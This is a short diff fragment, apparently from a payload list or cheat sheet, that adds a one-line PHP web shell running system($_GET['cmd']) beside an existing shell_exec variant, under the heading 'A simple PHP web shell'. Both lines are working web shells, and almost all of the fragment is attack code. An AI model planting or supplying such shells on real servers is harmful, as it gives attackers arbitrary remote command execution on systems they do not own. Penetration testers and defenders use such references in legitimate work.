@@ -5,6 +5,10 @@
 - A simple PHP web shell.
 
 ```shell
+<?php system($_GET['cmd']); ?>
+```
+
+```shell
 <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
 ```
 
